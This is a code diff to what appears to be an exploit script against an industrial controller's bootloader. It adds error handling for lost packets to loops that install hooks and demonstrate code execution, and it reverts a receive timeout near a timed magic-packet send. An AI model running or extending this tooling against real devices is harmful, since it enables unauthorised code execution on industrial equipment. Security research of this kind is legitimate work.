@@ -604,7 +604,13 @@ def handle_conn(r, action, args):
     elif action == ACTION_HELLO_LOOP:
         answ = invoke_add_hook(r, second_addhook_ind, await_response=False)
         while True:
-            print("Got packet: {}".format(recv_packet(r)))
+            packet = recv_packet(r)
+            if packet is None:
+                log.error("HELLO_LOOP: Failed to receive packet or connection possibly lost.")
+                time.sleep(0.5) # Avoid tight loop on continuous errors
+                # Consider breaking if this happens too often or if None means definite end
+                continue # Try to receive next packet
+            print("Got packet: {}".format(packet))
 
     elif action == ACTION_TIC_TAC_TOE:
         print("[*] Demonstrating Code Execution")
@@ -612,7 +618,14 @@ def handle_conn(r, action, args):
         msg = ""
         END_TOKEN = "==>"
         while END_TOKEN not in msg:
-            msg = recv_packet(r)
+            packet = recv_packet(r)
+            if packet is None:
+                log.error("TIC_TAC_TOE: Failed to receive packet or connection possibly lost.")
+                # Decide how to handle this: break, or try again?
+                # Breaking might be safest if communication is lost.
+                msg = "ERROR_RECEIVING_PACKET" # Ensure loop terminates or handles error state
+                break
+            msg = packet
             sys.stdout.write(msg)
             sys.stdout.flush()
 
@@ -758,15 +771,10 @@ def main():
         # We have 500000 microseconds (half a second) to hit the timing
         s.send(pad + magic)
 
-        answ = s.recv(256, timeout=0.3) # Reverted to short timeout
+        answ = s.recv(256, timeout=0.3) # Original short timeout
         if len(answ) > 0:
             if not answ.startswith("\5-CPU"):
-                # Try to receive a bit more with a very short timeout
-                # to complete a potentially fragmented response.
-                try:
-                    answ += s.recv(64, timeout=0.2) # Short timeout for the append
-                except Exception: # Catch timeout or other read errors
-                    pass # Proceed with what answ has
+                answ += s.recv(256) # Original logic for appending (default timeout)
             assert(answ.startswith("\5-CPU"))
             s.unrecv(answ)
 
